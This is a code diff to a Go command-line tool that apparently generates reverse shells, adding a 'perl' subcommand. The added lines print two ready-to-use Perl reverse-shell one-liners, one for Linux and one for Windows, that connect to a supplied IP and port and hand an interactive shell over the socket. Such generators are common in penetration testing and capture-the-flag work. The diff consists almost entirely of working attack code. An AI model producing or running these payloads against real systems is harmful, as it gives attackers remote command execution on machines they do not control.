@@ -82,6 +82,20 @@ func main() {
 				return nil
 			},
 		},
+		{
+			Name:  "perl",
+			Usage: "Generate a Perl reverse shell",
+			Flags: myFlags,
+			Action: func(c *cli.Context) error {
+				fmt.Print(fmt.Sprint(Magenta("-- for Linux (and maybe Windows):\n")))
+				fmt.Printf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n", c.String("ip"), c.String("port"))
+
+				fmt.Print(fmt.Sprint(Magenta("-- for Windows:\n")))
+				fmt.Printf("perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'\n", c.String("ip"), c.String("port"))
+
+				return nil
+			},
+		},
 	}
 
 	// Start message
